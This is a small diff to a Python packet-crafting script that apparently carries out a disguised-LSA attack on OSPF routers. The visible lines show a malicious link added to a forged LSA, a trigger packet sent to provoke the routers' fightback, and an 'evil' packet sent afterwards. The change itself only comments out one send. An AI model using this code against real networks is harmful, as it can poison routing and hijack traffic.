@@ -162,7 +162,6 @@ if __name__ == '__main__':
 								type=3,
 								data= "255.255.255.0",
 								id= "172.16.254.0")
-
 	"""
 	Addition of the malicious OSPF Link in the LSA_disguised packet.
 	"""
@@ -240,7 +239,7 @@ if __name__ == '__main__':
 	Send trigger packet to trigger the fightback mechanism
 	"""
 	sendp(pkt_trig, iface='eth1')
-	sendp(pkt_trig, iface='eth0')
+	# sendp(pkt_trig, iface='eth0')
 	sleep(2)
 	sendp(pkt_evil, iface='eth0')
 
